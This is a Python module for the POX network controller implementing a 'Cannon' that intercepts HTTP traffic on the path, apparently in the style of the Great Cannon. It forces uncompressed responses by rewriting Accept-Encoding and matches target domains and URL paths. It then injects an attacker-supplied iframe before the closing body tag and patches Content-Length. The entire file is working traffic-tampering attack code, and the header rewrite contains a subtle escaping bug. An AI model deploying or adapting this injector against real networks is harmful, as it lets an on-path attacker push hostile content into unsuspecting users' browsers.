from pox.lib.packet.ipv4 import ipv4
import pox.lib.packet as pkt
import re

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url
        self.incoming = {}
        self.outgoing = {}

    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
        script = "<iframe src=\"" + self.iframe_url + "\"></iframe></body>"

        # print "src = ", ip_packet.srcip
    	# print "dst = ", ip_packet.dstip

        # find tcp packet within ip packet
    	tcp_packet = ip_packet.find('tcp')
        if tcp_packet is not None:
            # extract data from tcp packet
            data = tcp_packet.payload
            if data is not None:

# =============================================================================
# Checking outgoing packets
# =============================================================================

                # find 'Accept-Encoding:..' to only accept uncompressed packets
                regex = "Accept-Encoding: (.*?)\\r\\n"
                search = re.search(regex, data)
                if search is not None:
                    result = search.group(0)
                    injectHeader = "Accept-Encoding: identity\\r\\n"
                    splitHeader  = data.split(result)
                    modified_packet = splitHeader[0] + injectHeader + splitHeader[1] 
                    data = modified_packet
                    ip_packet.payload.payload = modified_packet

                # Check domain
                regex = "Host: (.*?)\\r\\n"
                search = re.search(regex, data)
                if search is not None:
                    domain = search.group(1)
                    domainMatch = re.search(self.target_domain_re, domain)
                    if domainMatch is None:
                        return ip_packet
                    # Check url path
                    regex = "GET (.*?)\\r\\n"
                    search = re.search(regex, data)
                    if search is not None:
                        urlpath = search.group(1)
                        urlpathMatch = re.search(self.url_path_re, urlpath)
                        if urlpathMatch is not None:
                            # Save source/dest IPs
                            self.outgoing["srcip"] = ip_packet.srcip
                            self.incoming["dstip"] = ip_packet.dstip
                        else:
                            return ip_packet

# =============================================================================
# Checking incoming packets
# =============================================================================
               
                if ip_packet.srcip in self.incoming.values() and ip_packet.dstip in self.outgoing.values():
		    # modify content-length in header
                    regex = "Content-Length: (.*?)\\r\\n"
                    search = re.search(regex, data)
                    if search is not None:
                        contLength = int(search.group(1)) + len(script) - 7
                        contLenStr = "Content-Length: " + str(contLength) + "\r\n"
                        modified_packet = re.sub(regex, contLenStr, data)
                        data = modified_packet
                        ip_packet.payload.payload = modified_packet

		    # find </body> to insert
                    regex = "<\/body>(?![\s\S]*<\/body>[\s\S]*$)"
                    search = re.search(regex, data)
                    if search is not None:
                        modified_packet = re.sub(regex, script, data) 
                        ip_packet.payload.payload = modified_packet

    	# Must return an ip packet or None
    	return ip_packet

